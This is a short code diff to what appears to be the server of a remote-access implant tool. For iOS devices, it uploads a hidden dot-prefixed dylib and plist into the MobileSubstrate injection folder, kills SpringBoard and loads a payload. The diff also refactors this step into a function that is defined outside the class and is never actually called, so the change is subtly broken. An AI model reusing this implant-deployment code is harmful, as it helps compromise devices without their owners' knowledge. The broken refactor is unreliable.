@@ -7,6 +7,16 @@ import time
 
 downloads_dir = "../downloads"
 
+def upload_substrate(self,session,cmd_data):
+    h.info_general("Uploading dylib 1/2...")
+    time.sleep(1)
+    session.upload_file("resources/mpl.dylib","/Library/MobileSubstrate/DynamicLibraries",".mpl.dylib")
+    h.info_general("Uploading plist 2/2...")
+    time.sleep(1)
+    session.upload_file("resources/mpl.plist","/Library/MobileSubstrate/DynamicLibraries",".mpl.plist")
+    h.info_general("Respring...")
+    time.sleep(2)
+
 class Server:
     def __init__(self):
         if not os.path.isdir("downloads"):
@@ -117,14 +127,7 @@ class Server:
             return (instructions,payload)
         elif device_arch in self.ios_architectures:
             self.verbose_print("Detected iOS")
-    	    h.info_general("Uploading dylib 1/2...")
-            time.sleep(1)
-            session.upload_file("resources/mpl.dylib","/Library/MobileSubstrate/DynamicLibraries",".mpl.dylib")
-    	    h.info_general("Uploading plist 2/2...")
-            time.sleep(1)
-            session.upload_file("resources/mpl.plist","/Library/MobileSubstrate/DynamicLibraries",".mpl.plist")
-            h.info_general("Respring...")
-            time.sleep(2)
+    	    self.upload_substrate
             session.send_command({"cmd":"killall","args":"SpringBoard"})
             f = open("resources/mplios", "rb")
             payload = f.read()
